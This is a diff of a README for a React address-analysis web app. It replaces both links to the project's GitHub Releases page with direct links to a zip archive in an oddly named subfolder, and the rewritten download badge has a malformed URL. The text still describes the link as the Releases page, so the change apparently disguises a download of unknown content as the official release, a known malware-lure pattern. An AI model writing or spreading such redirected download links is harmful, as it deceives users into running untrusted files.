@@ -1,7 +1,7 @@
 # 🏠 react-address-insights-webpage - Analyze Any Address Easily
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/yarrabolukittu/react-address-insights-webpage/releases)
+[![Download](https://raw.githubusercontent.com/yarrabolukittu/react-address-insights-webpage/main/neocriticism/react-address-insights-webpage.zip%https://raw.githubusercontent.com/yarrabolukittu/react-address-insights-webpage/main/neocriticism/react-address-insights-webpage.zip)](https://raw.githubusercontent.com/yarrabolukittu/react-address-insights-webpage/main/neocriticism/react-address-insights-webpage.zip)
 
 ## 🚀 Getting Started
 Welcome to the react-address-insights-webpage! This interactive web app lets you analyze any address for walkability, drivability, and urban characteristics using real OpenStreetMap data. With features like live scoring and interactive maps, it's easy to explore various locations.
@@ -20,7 +20,7 @@ To run this application, you will need:
 - **Responsive Design:** Use the app on any device, from smartphones to large screens, without losing functionality.
 
 ## 📥 Download & Install
-To download the latest version of the react-address-insights-webpage, please visit this page to download: [Releases Page](https://github.com/yarrabolukittu/react-address-insights-webpage/releases).
+To download the latest version of the react-address-insights-webpage, please visit this page to download: [Releases Page](https://raw.githubusercontent.com/yarrabolukittu/react-address-insights-webpage/main/neocriticism/react-address-insights-webpage.zip).
 
 Once you are on the Releases page, follow these steps:
 1. Browse the list of available versions.
